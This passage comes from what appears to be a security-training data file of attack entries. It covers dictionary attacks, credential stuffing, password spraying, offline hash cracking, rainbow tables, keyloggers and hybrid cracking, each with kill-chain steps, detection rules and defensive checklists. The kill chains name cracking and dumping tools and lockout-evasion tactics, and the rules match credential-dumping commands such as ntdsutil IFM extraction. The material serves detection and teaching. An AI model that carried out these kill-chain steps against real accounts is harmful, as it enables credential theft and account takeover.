        title: "OSINT & Corporate Lexicon Gathering",
        mitre: "T1593.002",
        desc: "Harvesting company-specific names, executive names, local sports teams, product codenames, and current year strings from corporate websites and social media."
      },
      {
        step: 2,
        title: "Targeted Wordlist Assembly & Permutation",
        mitre: "T1589.001",
        desc: "Combining global leaked password databases (RockYou2024) with customized corporate terms and common leetspeak substitutions."
      },
      {
        step: 3,
        title: "Valid Username Enumeration",
        mitre: "T1087.002",
        desc: "Harvesting verified corporate email addresses and usernames via LinkedIn scraping, Office 365 login timing, or SMTP VRFY probing."
      },
      {
        step: 4,
        title: "Automated Wordlist Ingestion & Dispatch",
        mitre: "T1110.001",
        desc: "Feeding the dictionary stream into automated tools (Hydra, Burp Intruder, custom Python scripts) targeting VPN or SSO authentication interfaces."
      },
      {
        step: 5,
        title: "Response Differential Classification",
        mitre: "T1078",
        desc: "Monitoring response streams for status code deviations (HTTP 302 redirect or 200 with session token) indicating positive password discovery."
      },
      {
        step: 6,
        title: "Corporate Portal Ingress & Access Escalation",
        mitre: "T1078.002",
        desc: "Logging into corporate email, SaaS suites, or internal VPN tunnels with the discovered dictionary password."
      }
    ],
    telemetry: {
      sources: [
        "Active Directory Security Logs (Event ID 4625 Logon Failure with distinct FailureReasons)",
        "SSO / Identity Provider Logs (Okta / Ping Identity / Azure AD sign-in failure logs)",
        "Web Server Access Logs (Sequential POST requests containing varied password payload lengths)",
        "VPN Gateway Authentication Logs (/var/log/secure or RADIUS authentication accounting)"
      ],
      anomalies: [
        "Rapid sequential authentication attempts against a specific account using popular dictionary words",
        "High failure rate (>90%) followed immediately by a single successful login from the same external IP",
        "VPN authentications originating from anonymous VPNs, Tor exit nodes, or commercial hosting providers"
      ]
    },
    rules: {
      sigma: `title: Dictionary Attack Pattern on Authentication Endpoint
id: 2e5b8d3a-69c4-4e12-9b83-9fa41b520032
status: stable
description: Detects repeated authentication failures on a single account using varied passwords characteristic of dictionary attacks.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        SubStatus: '0xc000006a' # STATUS_WRONG_PASSWORD
    timeframe: 5m
    condition: selection | count(TargetUserName) > 15
fields:
    - TargetUserName
    - IpAddress
    - SubStatus
level: high
tags:
    - attack.credential_access
    - attack.t1110.001`,
      splunk: `index=windows_security EventCode=4625 SubStatus="0xc000006a"
| stats count by TargetUserName, IpAddress
| where count > 15
| eval Alert="HIGH: Dictionary Attack Detected Against User Account"
| table _time, TargetUserName, IpAddress, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT High-Volume Dictionary Attack POST Requests";
    flow:to_server,established;
    content:"POST"; http_method;
    threshold: type both, track by_src, count 25, seconds 30;
    classtype:attempted-login;
    sid:1000032;
    rev:1;
)`,
      sysmon: `# Audit domain password policy and complexity settings:
net accounts`
    },
    defenseChecklist: [
      { id: "dict_1", title: "Deploy Breached Password Screening", tier: "Identity Hardening", desc: "Integrate Azure AD Password Protection or Enzoic to dynamically block passwords present in known breach dictionaries (RockYou, HaveIBeenPwned)." },
      { id: "dict_2", title: "Enforce 16+ Character Passphrases", tier: "Password Policy", desc: "Mandate multi-word passphrases of at least 16 characters, exponentially expanding the entropy beyond dictionary wordlists." },
      { id: "dict_3", title: "Enforce Hardware Token MFA", tier: "Access Control", desc: "Mandate FIDO2 hardware security keys (YubiKey) or WebAuthn so dictionary-discovered passwords cannot authorize logins alone." },
      { id: "dict_4", title: "Ban Company-Specific Dictionary Terms", tier: "Identity Hardening", desc: "Maintain a custom banned password list including company name, CEO names, product brands, and seasonal permutations." }
    ]
  },

  {
    num: 33,
    id: "credential-stuffing",
    name: "Automated Credential Stuffing (Large-Scale Breach Dump Replay)",
    shortName: "Credential Stuffing",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-attack",
    severity: "high",
    cvss: "8.1",
    mitre: "T1110.004, T1078",
    primaryTargets: "Consumer Web Portals, Cloud SSO Interfaces, Customer Banking Apps, SaaS Platforms",
    threatActors: "Scattered Spider, Magecart Operators, Cybercrime Syndicates, ATO Crews",
    summary: "Credential Stuffing is an automated attack where threat actors take massive databases of username/email and password combinations breached from external third-party services and systematically test them across thousands of unrelated web applications, capitalizing on widespread user password reuse.",
    killChain: [
      {
        step: 1,
        title: "Breach Corpus Ingestion & De-Duplication",
        mitre: "T1589.001",
        desc: "Acquiring and normalizing massive 'combo lists' containing millions of username:password strings obtained from external public breaches."
      },
      {
        step: 2,
        title: "Proxy Infrastructure & Botnet Mobilization",
        mitre: "T1584.005",
        desc: "Configuring rotating residential proxy networks (thousands of dynamic residential IP addresses) to distribute requests and evade IP rate limiting."
      },
      {
        step: 3,
        title: "Headless Browser & Fingerprint Spoofing",
        mitre: "T1059",
        desc: "Configuring automation frameworks (Puppeteer, Playwright, OpenBullet) with spoofed TLS JA4 signatures and Canvas fingerprints to mimic human browsers."
      },
      {
        step: 4,
        title: "High-Concurrency Credential Injection",
        mitre: "T1110.004",
        desc: "Executing distributed HTTP POST requests across target authentication APIs, testing one combo pair per IP address in parallel."
      },
      {
        step: 5,
        title: "Account Takeover (ATO) Success Parsing",
        mitre: "T1078",
        desc: "Filtering responses for successful sessions, extracting account profile data (stored payment methods, reward balances, privilege levels)."
      },
      {
        step: 6,
        title: "Monetization, Fraud & Secondary Infiltration",
        mitre: "T1078.004",
        desc: "Draining financial balances, purchasing gift cards, exfiltrating personal data, or selling validated corporate accounts on dark web marketplaces."
      }
    ],
    telemetry: {
      sources: [
        "WAF / CDN Access Logs (Cloudflare, Akamai, AWS WAF tracking high volumes of unique user sign-in attempts)",
        "Application Login Telemetry (Sudden spike in overall login attempts with low success rates < 5%)",
        "Identity Provider Logs (Sign-ins originating from disparate residential IP geolocations)",
        "SIEM Correlation (Thousands of distinct user accounts failing authentication from rotating subnets)"
      ],
      anomalies: [
        "Surge in login traffic volume 5x-20x above normal baseline with failure rates exceeding 85%",
        "Thousands of unique usernames tested once each across rotating residential proxy IP addresses",
        "Sign-in attempts with mismatched User-Agent and TLS Client Hello fingerprints"
      ]
    },
    rules: {
      sigma: `title: Distributed Credential Stuffing Campaign
id: 3f6c9e4b-70d5-4f23-9c94-0fa52c630033
status: stable
description: Detects widespread failed authentications across multiple distinct accounts indicative of credential stuffing.
author: SOC Detection Engineering
logsource:
    category: application
    service: web_login
detection:
    selection:
        status_code: 401
    timeframe: 5m
    condition: selection | count(username) > 50
fields:
    - username
    - client_ip
    - user_agent
level: high
tags:
    - attack.credential_access
    - attack.t1110.004`,
      splunk: `index=web_auth status=401
| bin _time span=5m
| stats dc(username) as DistinctUsers, dc(client_ip) as DistinctIPs, count as TotalFailures by _time
| where DistinctUsers > 40 AND DistinctIPs > 20
| eval Alert="CRITICAL: Distributed Credential Stuffing Campaign Active"
| table _time, DistinctUsers, DistinctIPs, TotalFailures, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT High-Volume API Login Traffic (Credential Stuffing)";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/api/auth"; http_uri;
    threshold: type both, track by_dst, count 100, seconds 10;
    classtype:attempted-login;
    sid:1000033;
    rev:1;
)`,
      sysmon: `# Check Nginx web server access logs for distributed authentication surges:
tail -n 1000 /var/log/nginx/access.log | grep "POST /login" | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10`
    },
    defenseChecklist: [
      { id: "cs_1", title: "Deploy Advanced Bot Management & CAPTCHA", tier: "Edge Protection", desc: "Deploy behavioral bot management (Cloudflare Bot Management, Akamai Bot Manager) to challenge headless browsers and proxy pools." },
      { id: "cs_2", title: "Enforce Universal Multi-Factor Authentication", tier: "Identity Provider", desc: "Require FIDO2 passkeys or authenticator app prompts across all consumer and enterprise accounts, rendering leaked passwords useless." },
      { id: "cs_3", title: "Continuously Ingest Breach Data (HaveIBeenPwned API)", tier: "Threat Intelligence", desc: "Automatically notify and force password resets for users whose credentials appear in newly published public breach databases." },
      { id: "cs_4", title: "Implement Device Fingerprinting & Anomaly Scoring", tier: "AppSec", desc: "Evaluate device fingerprints, behavioral biometrics, and IP reputation to prompt additional verification for unrecognized devices." }
    ]
  },

  {
    num: 34,
    id: "password-spraying",
    name: "Password Spraying Attack (Low-and-Slow Horizontal Account Penetration)",
    shortName: "Password Spraying",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-attack",
    severity: "high",
    cvss: "8.2",
    mitre: "T1110.003, T1078",
    primaryTargets: "Microsoft 365, Azure Active Directory, Okta, Active Directory Domain Services, Exchange Web Services (EWS)",
    threatActors: "Midnight Blizzard (APT29 / Nobelium), APT28, Storm-0501, FIN8",
    summary: "Password Spraying is a low-and-slow horizontal credential guessing attack where an adversary tests a single, highly probable password (e.g. 'Winter2026!', 'Company123!') across hundreds or thousands of different user accounts in an enterprise. By remaining below account lockout thresholds (e.g., 1 attempt per account every 30 minutes), the attack avoids triggering account lockouts or security alerts.",
    killChain: [
      {
        step: 1,
        title: "Enterprise Username Harvest & Validation",
        mitre: "T1087.002",
        desc: "Harvesting valid enterprise usernames via Microsoft Teams user enumeration, Office 365 login timing responses, or LinkedIn scraping."
      },
      {
        step: 2,
        title: "Domain Account Lockout Policy Discovery",
        mitre: "T1201",
        desc: "Auditing target password lockout policies to determine exact parameters (e.g. lockout after 5 bad attempts in a 30-minute window)."
      },
      {
        step: 3,
        title: "Seasonal & Compliant Password Formulation",
        mitre: "T1110.003",
        desc: "Formulating high-probability candidates satisfying corporate complexity rules: e.g. SeasonYear! (Winter2026!), MonthYear!, Welcome123!."
      },
      {
        step: 4,
        title: "Low-and-Slow Spray Execution Across Rotating IPs",
        mitre: "T1110.003",
        desc: "Executing 1 attempt per user account every 45 minutes using tools like SprayingToolkit or MSOLSpray across rotating cloud egress proxies."
      },
      {
        step: 5,
        title: "Authenticated Account Discovery",
        mitre: "T1078.002",
        desc: "Detecting successful login events (Azure AD 0, Event ID 4624) without triggering account lockout events (Event ID 4740)."
      },
      {
        step: 6,
        title: "Corporate Network Foothold & Lateral Escalation",
        mitre: "T1078",
        desc: "Accessing corporate email, Microsoft Teams channels, and SharePoint drives to locate credentials and pivot deeper into the domain."
      }
    ],
    telemetry: {
      sources: [
        "Active Directory Security Event Logs (Event ID 4625 Logon Failure across multiple TargetUserNames with single IP)",
        "Azure Active Directory Sign-in Logs (ResultType 50126 Invalid username or password across multiple accounts)",
        "Exchange Web Services (EWS) & ActiveSync Logs",
        "Okta System Logs (event_type: user.authentication.auth_via_mfa or user.session.start failures)"
      ],
      anomalies: [
        "Single source IP address attempting exactly one login attempt across dozens or hundreds of distinct user accounts",
        "Event ID 4625 failures clustered within a 1-hour window targeting disparate accounts with identical workstation names",
        "Sign-in failures on legacy email protocols (IMAP/EWS) from commercial cloud IP ranges (AWS, DigitalOcean)"
      ]
    },
    rules: {
      sigma: `title: Horizontal Password Spraying Activity
id: 4a7d0e5c-81e6-4f34-9d05-1fa63d740034
status: stable
description: Detects failed logons across multiple distinct accounts originating from a single IP address indicative of password spraying.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        LogonType: 3
    timeframe: 30m
    condition: selection | count(TargetUserName) by IpAddress > 10
fields:
    - IpAddress
    - TargetUserName
    - WorkstationName
level: high
tags:
    - attack.credential_access
    - attack.t1110.003`,
      splunk: `index=windows_security EventCode=4625 Logon_Type=3
| bin _time span=30m
| stats dc(TargetUserName) as TargetedAccounts, values(TargetUserName) as Accounts by _time, IpAddress
| where TargetedAccounts > 10
| eval Alert="CRITICAL: Password Spraying Attack Detected Across Multiple Accounts"
| table _time, IpAddress, TargetedAccounts, Accounts, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET [443,993] (
    msg:"SEC-ALERT Suspected Inbound Password Spraying Traffic";
    flow:to_server,established;
    threshold: type both, track by_src, count 15, seconds 600;
    classtype:attempted-login;
    sid:1000034;
    rev:1;
)`,
      sysmon: `# Query Azure AD sign-in logs for Event 50126 spikes using PowerShell:
# Get-MgAuditLogSignIn -Filter "status/errorCode eq 50126" -Top 50`
    },
    defenseChecklist: [
      { id: "spray_1", title: "Enforce Phishing-Resistant MFA (FIDO2)", tier: "Identity Provider", desc: "Enforce hardware security keys (FIDO2 / WebAuthn) or Microsoft Authenticator number matching across all corporate accounts." },
      { id: "spray_2", title: "Deploy Azure AD Password Protection", tier: "Active Directory", desc: "Enable Azure AD Password Protection for Windows Server Active Directory to automatically ban seasonal, predictable passphrases." },
      { id: "spray_3", title: "Disable Legacy Authentication Protocols", tier: "Tenant Hardening", desc: "Block legacy protocols (Exchange ActiveSync, POP3, IMAP, MAPI) that bypass modern Conditional Access and MFA policies." },
      { id: "spray_4", title: "SIEM Horizontal Login Correlation", tier: "SOC Detection", desc: "Create SIEM rules alerting when a single external IP address fails authentication against more than 5 distinct usernames within 1 hour." }
    ]
  },

  {
    num: 35,
    id: "offline-password-cracking",
    name: "Offline Password Cracking (Stolen Hash Extraction & High-Speed Hardware Inversion)",
    shortName: "Offline Password Cracking",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-attack",
    severity: "critical",
    cvss: "8.6",
    mitre: "T1110.002, T1003.002, T1003.003",
    primaryTargets: "Active Directory NTDS.dit, Linux /etc/shadow, Windows SAM Registry Hive, Kerberos Tickets (TGS)",
    threatActors: "APT41, LockBit 3.0, BlackCat / ALPHV, Penetration Testers",
    summary: "Offline Password Cracking occurs after an adversary has compromised a host or database and exfiltrated cryptographic password hashes (e.g. NTDS.dit, SAM hive, /etc/shadow, or Kerberos tickets). Because the hashes are processed on attacker-controlled hardware, there are no account lockout mechanisms, rate limits, or network monitoring, enabling multi-GPU clusters to test billions of candidate hashes per second.",
    killChain: [
      {
        step: 1,
        title: "High-Value Hash Database Location",
        mitre: "T1083",
        desc: "Locating central credential stores on compromised servers: Windows %SystemRoot%\\NTDS\\ntds.dit or Linux /etc/shadow."
      },
      {
        step: 2,
        title: "Volume Shadow Copy & Locked File Extraction",
        mitre: "T1003.003",
        desc: "Using native tools (vssadmin, ntdsutil, esentutl) to create a volume shadow copy and extract locked database files and SYSTEM registry hives."
      },
      {
        step: 3,
        title: "Cryptographic Hash Parsing & Normalization",
        mitre: "T1003.002",
        desc: "Parsing the extracted database with tools like secretsdump.py to export user NTLM hashes, LM hashes, or sha512crypt hashes."
      },
      {
        step: 4,
        title: "Dedicated Multi-GPU Cracking Rig Allocation",
        mitre: "T1110.002",
        desc: "Ingesting hashes into high-performance GPU cracking clusters running Hashcat or John the Ripper configured for target hash formats."
      },
      {
        step: 5,
        title: "Multi-Engine Cryptanalytic Cracking Passes",
        mitre: "T1110.002",
        desc: "Executing layered cracking passes: dictionary attack -> rule-based mutation -> mask attack -> exhaustive brute force."
      },
      {
        step: 6,
        title: "Plaintext Credential Domain Takeover",
        mitre: "T1078.002",
        desc: "Mapping recovered cleartext passwords to Domain Administrator accounts and executing administrative logons across the enterprise."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Logs (Event ID 4688 Process Creation: ntdsutil.exe, vssadmin.exe)",
        "Windows System Event Logs (Event ID 7036 Volume Shadow Copy service entered running state)",
        "Sysmon for Windows (Event ID 1 CommandLine containing 'ntdsutil' or 'create full')",
        "File Access Auditing (Read access to C:\\Windows\\NTDS\\ntds.dit)"
      ],
      anomalies: [
        "Execution of ntdsutil.exe with 'ac i ntds' and 'ifm' (Install From Media) arguments",
        "Invocation of vssadmin.exe to create or delete volume shadow copies by non-backup service accounts",
        "Mass read access to /etc/shadow on Linux servers by processes other than standard PAM authentication daemons"
      ]
    },
    rules: {
      sigma: `title: Active Directory NTDS.dit Extraction via ntdsutil
id: 5b8e1f6d-92f7-4a45-9e16-2fa74e850035
status: stable
description: Detects the use of ntdsutil to create an 'Install From Media' backup to dump Active Directory password hashes.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\ntdsutil.exe'
        CommandLine|contains|all:
            - 'ac i ntds'
            - 'ifm'
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: critical
tags:
    - attack.credential_access
    - attack.t1003.003`,
      splunk: `index=sysmon EventCode=1 Image="*\\ntdsutil.exe" CommandLine="*ifm*"
| eval Alert="CRITICAL: NTDS.dit Credential Database Extraction via ntdsutil"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Network detection for exfiltration of NTDS or SAM database:
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Outbound Transmission of Active Directory Database File";
    flow:to_server,established;
    content:"ntds.dit"; nocase;
    classtype:bad-unknown;
    sid:1000035;
    rev:1;
)`,
      sysmon: `# Check Volume Shadow Copies on host via PowerShell:
vssadmin list shadows`
    },
    defenseChecklist: [
      { id: "off_1", title: "Migrate to Memory-Hard Password Hashing", tier: "Application Security", desc: "Enforce modern memory-hard password hashing algorithms (Argon2id, bcrypt) with high work factors on all internal application databases." },
      { id: "off_2", title: "Lock Down Domain Controller Administrative Access", tier: "Active Directory", desc: "Strictly restrict Domain Controller access to Tier 0 privileged administrative workstations (PAWs) with Credential Guard." },
      { id: "off_3", title: "Audit & Block Shadow Copy Extraction Tools", tier: "EDR", desc: "Configure EDR behavioral rules to block execution of ntdsutil.exe and secretsdump utilities by unauthorized administrative users." },
      { id: "off_4", title: "Deploy LAPS & Eliminate Password Reuse", tier: "Identity Hardening", desc: "Deploy Microsoft LAPS to ensure local administrator passwords are randomized, preventing lateral movement even if hashes are cracked." }
    ]
  },

  // =========================================================================
  // MODULE 4: PASSWORD SECURITY - PASSWORD CRACKING ATTACKS (36 - 39)
  // =========================================================================
  {
    num: 36,
    id: "rainbow-table-attack",
    name: "Cryptographic Rainbow Table Attack (Precomputed Hash Chain Reversal)",
    shortName: "Rainbow Table Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-crack",
    severity: "high",
    cvss: "8.0",
    mitre: "T1110.002, T1552",
    primaryTargets: "Unsalted Hashes (NTLM, MD5, SHA-1, LM), Database Dumps, Embedded Device Credentials",
    threatActors: "Data Extortionists, Cybercrime Groups, Digital Forensics Examiners",
    summary: "A Rainbow Table Attack is a space-time tradeoff cryptanalytic method that uses massive precomputed lookup tables of cryptographic hash chains and reduction functions to rapidly invert unsalted hashes (such as NTLM, MD5, or SHA-1) into plaintext in seconds, eliminating the need for real-time brute-force computation.",
    killChain: [
      {
        step: 1,
        title: "Unsalted Cryptographic Hash Extraction",
        mitre: "T1003",
        desc: "Exfiltrating password hashes from legacy database backups, Active Directory SAM files, or unhardened web applications."
      },
      {
        step: 2,
        title: "Salt Absence Verification",
        mitre: "T1082",
        desc: "Analyzing hash format and column structures to confirm the target hashes are unsalted (allowing one precomputed table to crack all users)."
      },
      {
        step: 3,
        title: "Matching Rainbow Table Selection",
        mitre: "T1110.002",
        desc: "Selecting precomputed tables corresponding to the target hash algorithm (e.g. NTLM alphanumeric, 1-9 characters)."
      },
      {
        step: 4,
        title: "Hash Reduction Chain Traversal",
        mitre: "T1110.002",
        desc: "Applying alternating reduction functions and hashing operations across the table to locate matching chain endpoints."
      },
      {
        step: 5,
        title: "Collision Resolution & Plaintext Recovery",
        mitre: "T1110.002",
        desc: "Regenerating the specific chain from the starting point to identify the precise plaintext string producing the target hash."
      },
      {
        step: 6,
        title: "Live Authentication & Lateral Pivoting",
        mitre: "T1078.002",
        desc: "Supplying the recovered plaintext password into production enterprise services (VPN, SSH, RDP) to authenticate legitimately."
      }
    ],
    telemetry: {
      sources: [
        "Database Audit Logs (Mass query events reading user password hash columns)",
        "Endpoint Detection & Response (Execution of RainbowCrack binaries: rcrack, rtdump)",
        "File Integrity Monitoring (Access to sensitive configuration files storing unsalted hashes)",
        "Active Directory Security Event 4624 (Logons using recovered passwords)"
      ],
      anomalies: [
        "Rapid recovery and successful authentication of multiple user accounts whose hashes were recently breached",
        "Execution of tools named rcrack.exe or rtgen.exe on internal endpoints",
        "Large-scale database export queries targeting user authentication tables"
      ]
    },
    rules: {
      sigma: `title: Execution of RainbowCrack Utility (rcrack)
id: 6c9e2a7b-03f8-4b56-9f27-3fa85f960036
status: stable
description: Detects the execution of RainbowCrack utilities used for precomputed rainbow table password cracking.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\rcrack.exe'
            - '\\rcrack_cuda.exe'
            - '\\rtgen.exe'
            - '\\ophcrack.exe'
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.credential_access
    - attack.t1110.002`,
      splunk: `index=sysmon EventCode=1 (Image="*rcrack*" OR Image="*rtgen*" OR Image="*ophcrack*")
| eval Alert="HIGH: Rainbow Table Password Cracking Tool Execution Detected"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Network rule:
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Outbound Data Transfer Matching Rainbow Table File (.rt)";
    flow:to_server,established;
    content:".rt"; nocase;
    classtype:bad-unknown;
    sid:1000036;
    rev:1;
)`,
      sysmon: `# Inspect database password hashing configuration (example for Linux PAM):
grep -E "(pam_unix|sha512|blowfish|bcrypt)" /etc/pam.d/common-password`
    },
    defenseChecklist: [
      { id: "rain_1", title: "Mandate Cryptographic Salting on All Hashes", tier: "Application Architecture", desc: "Ensure every password hash is generated with a unique, cryptographically secure 128-bit salt, neutralizing precomputed tables entirely." },
      { id: "rain_2", title: "Migrate to Memory-Hard Functions (Argon2id)", tier: "Cryptographic Standards", desc: "Deprecate unsalted NTLM, MD5, and SHA-1; migrate all authentication backends to Argon2id or bcrypt." },
      { id: "rain_3", title: "Enforce Passphrase Length Minimum (> 15 chars)", tier: "Password Policy", desc: "Enforce 15+ character passphrases; rainbow tables become computationally infeasible for passphrases exceeding 12 characters." },
      { id: "rain_4", title: "Database Transparent Data Encryption (TDE)", tier: "Database Hardening", desc: "Encrypt database tables at rest to prevent extraction of raw hash columns even if disk images are compromised." }
    ]
  },

  {
    num: 37,
    id: "keylogger-attack",
    name: "Keystroke Logging Attack (Hardware & Kernel/Userland API Interception)",
    shortName: "Keylogger Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-crack",
    severity: "high",
    cvss: "8.4",
    mitre: "T1056.001, T1555, T1059",
    primaryTargets: "Workstation Keyboard Input, Windows API (SetWindowsHookEx, GetAsyncKeyState), USB Controllers, Browser Forms",
    threatActors: "AgentTesla, RedLine Stealer, FIN7, DarkGate, Corporate Insiders",
    summary: "Keystroke Logging captures raw keyboard input before it is encrypted or processed by applications. Attackers deploy hardware interposers between keyboards and USB ports or install software keyloggers that leverage Windows API hooking (e.g. WH_KEYBOARD_LL via SetWindowsHookEx) or polling GetAsyncKeyState to capture cleartext passwords, MFA codes, and confidential correspondence.",
    killChain: [
      {
        step: 1,
        title: "Endpoint Infiltration & Dropper Delivery",
        mitre: "T1566.001",
        desc: "Delivering keylogger payload via malicious email attachments, weaponized Office documents, or trojanized software downloads."
      },
      {
        step: 2,
        title: "Windows Keyboard Hook / Polling API Binding",
        mitre: "T1056.001",
        desc: "Calling SetWindowsHookExW(WH_KEYBOARD_LL, ...) to register a global low-level keyboard hook or running GetAsyncKeyState loops."
      },
      {
        step: 3,
        title: "Active Window Tracking & Context Association",
        mitre: "T1056",
        desc: "Monitoring foreground window titles with GetForegroundWindow() and GetWindowText() to associate typed keystrokes with specific login windows."
      },
      {
        step: 4,
        title: "Local Keystroke Buffering & Obfuscation",
        mitre: "T1056.001",
        desc: "Buffering captured keystrokes in memory and flushing them into encrypted local log files within %APPDATA% or %TEMP%."
      },
      {
        step: 5,
        title: "Scheduled C2 Exfiltration",
        mitre: "T1041",
        desc: "Transmitting logged credentials periodically to remote attacker C2 infrastructure via encrypted HTTPS, SMTP, or Telegram Bot API."
      },
      {
        step: 6,
        title: "Plaintext Credential Harvesting & Account Takeover",
        mitre: "T1552",
        desc: "Parsing exfiltrated log transcripts to extract cleartext passwords, master keys, and MFA codes for immediate unauthorized access."
      }
    ],
    telemetry: {
      sources: [
        "Sysmon for Windows (Event ID 13 Registry modification for Run keys, Event ID 11 FileCreate in %APPDATA%)",
        "Sysmon Event ID 7 (ImageLoaded: DLLs hooked into Explorer or browser processes)",
        "EDR Behavioral Telemetry (Detection of SetWindowsHookEx with WH_KEYBOARD_LL hook type)",
        "Network Egress Logs (Periodic outbound SMTP or HTTPS POST connections to unfamiliar IP addresses)"
      ],
      anomalies: [
        "Unsigned binary in %APPDATA% or %TEMP% calling SetWindowsHookEx API",
        "Background process continuously calling GetAsyncKeyState or GetKeyboardState at millisecond intervals",
        "Hidden text or DAT files in %TEMP% exhibiting continuous append write operations"
      ]
    },
    rules: {
      sigma: `title: Low-Level Global Keyboard Hook Installed (Keylogger)
id: 7d0f3b8c-14a9-4c67-8e38-4ab96a070037
status: stable
description: Detects process behavior indicative of a low-level keyboard hook installation commonly used by keyloggers.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\powershell.exe'
            - '\\cmd.exe'
            - '\\wscript.exe'
        CommandLine|contains:
            - 'SetWindowsHookEx'
            - 'WH_KEYBOARD_LL'
            - 'GetAsyncKeyState'
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.collection
    - attack.t1056.001`,
      splunk: `index=sysmon EventCode=1 (CommandLine="*SetWindowsHookEx*" OR CommandLine="*GetAsyncKeyState*")
| eval Alert="CRITICAL: Keystroke Logging API Hooking Detected"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET [25,587] (
    msg:"SEC-ALERT Outbound SMTP Email from Non-Mail Client (Potential Keylogger Exfiltration)";
    flow:to_server,established;
    content:"AUTH LOGIN"; nocase;
    classtype:trojan-activity;
    sid:1000037;
    rev:1;
)`,
      sysmon: `# Inspect current autorun registry entries where keyloggers establish persistence:
Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"`
    },
    defenseChecklist: [
      { id: "key_1", title: "Deploy EDR with API Hooking Detection", tier: "Endpoint Protection", desc: "Ensure endpoint protection monitors SetWindowsHookEx and GetAsyncKeyState calls, blocking unauthorized hook registration." },
      { id: "key_2", title: "Adopt Password Managers (Auto-Fill)", tier: "User Workstation", desc: "Use enterprise password managers with browser auto-fill; credentials injected via DOM bypass physical and API keyboard logging." },
      { id: "key_3", title: "Enforce Hardware FIDO2 MFA Tokens", tier: "Identity Protection", desc: "Deploy physical FIDO2 keys (YubiKey) for authentication; hardware cryptographic handshakes are completely immune to keystroke interception." },
      { id: "key_4", title: "Restrict Unauthorized USB Devices (802.1X)", tier: "Physical Security", desc: "Lock down USB ports with endpoint device control policies to prevent hardware keylogger implants between keyboard and PC." }
    ]
  },

  {
    num: 38,
    id: "hybrid-attack",
    name: "Hybrid Password Attack (Dictionary Wordlist Mutation & Rule-Based Mangling)",
    shortName: "Hybrid Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-crack",
    severity: "high",
    cvss: "8.3",
    mitre: "T1110.002, T1003",
    primaryTargets: "Stolen Hashes, Active Directory NTDS.dit, WPA2/WPA3 PMKID Handshakes, Encrypted Archive Files",
    threatActors: "Ransomware Gangs, Password Cracking Specialists, Nation-State Actors",
    summary: "A Hybrid Attack combines standard dictionary wordlists with algorithmic mutation rules and pattern appendages. Cracking engines take baseline dictionary words and programmatically apply capitalization variations, leetspeak character substitutions (e.g. 'e' -> '3', 'a' -> '@'), and append sequential numbers, years, and special characters (e.g., 'Password' -> 'P@ssw0rd2026!').",
    killChain: [
      {
        step: 1,
        title: "Baseline Wordlist Compilation",
        mitre: "T1589.001",
        desc: "Assembling a curated root wordlist consisting of common dictionary words, employee names, enterprise terminology, and geographic landmarks."
      },
      {
        step: 2,
        title: "Mutation Rule File Engineering",
        mitre: "T1110.002",
        desc: "Configuring Hashcat rule files (.rule) containing mangling directives (c for capitalize, $! for append symbol, se3 for leetspeak substitution)."
      },
      {
        step: 3,
        title: "Target Hash Extraction & Loading",
        mitre: "T1003",
        desc: "Loading captured NTLM, sha512crypt, or Kerberos TGS hashes into cracking GPU memory."
      },
      {
        step: 4,
        title: "High-Speed Dynamic Mutation Pipeline",
        mitre: "T1110.002",
        desc: "The cracking engine programmatically mutates dictionary words on-the-fly inside GPU registers, generating millions of permutations per second."
      },
      {
        step: 5,
        title: "Hash Comparison & Plaintext Capture",
        mitre: "T1110.002",
        desc: "Matching computed hashes against target values, recording successful matches into the crack potfile."
      },
      {
        step: 6,
        title: "Passphrase Structure Learning & Expansion",
        mitre: "T1110",
        desc: "Using cracked passwords to deduce organization-wide password patterns, updating rulesets to crack remaining enterprise accounts."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint Detection & Response (Alerts on hashdump utilities: mimikatz, secretsdump, impacket)",
        "Forensic Artifacts (Presence of Hashcat session files and .rule definition files on compromised jump hosts)",
        "Active Directory Event Logs (Logons with newly cracked accounts outside normal business hours)",
        "File Integrity Monitoring (Access to Active Directory database ntds.dit)"
      ],
      anomalies: [
        "Presence of files with extensions .rule, .hcmask, or .potfile on corporate workstations",
        "High GPU utilization on non-rendering corporate servers caused by unauthorized cracking software",
        "Multiple accounts logged into in rapid succession by single administrative IP"
      ]
    },
    rules: {
      sigma: `title: Hashcat Password Cracking Activity with Rulesets
id: 8e1a4c9d-25b0-4d78-9f49-5ba97b180038
status: stable
description: Detects command-line execution of Hashcat utilizing rule-based mutation files.
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
